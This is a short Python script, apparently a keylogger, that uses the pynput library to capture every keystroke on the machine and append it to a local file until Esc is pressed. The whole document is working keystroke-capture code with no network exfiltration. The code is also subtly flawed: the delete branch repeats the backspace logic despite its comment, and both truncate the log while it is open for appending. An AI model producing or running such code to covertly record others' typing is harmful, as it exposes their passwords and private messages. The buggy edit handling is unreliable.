from pynput import keyboard
import os

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if key == keyboard.Key.space:
                f.write('[SPACE] ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                # Handle backspace by deleting the last character from the file
                if os.path.getsize('keylogs.txt') > 0:
                    with open('keylogs.txt', 'rb+') as f_temp:
                        f_temp.seek(-1, os.SEEK_END)
                        f_temp.truncate()
            elif key == keyboard.Key.delete:
                # Handle delete by deleting the next character from the file
                if os.path.getsize('keylogs.txt') > 0:
                    with open('keylogs.txt', 'rb+') as f_temp:
                        f_temp.seek(-1, os.SEEK_END)
                        f_temp.truncate()
            elif key == keyboard.Key.esc:
                return False
            else:
                char = str(key).replace("'", "")
                if len(char) > 3:
                    f.write('[' + char + '] ')
                else:
                    f.write(char)
    except Exception as e:
        print(f"An error occurred: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()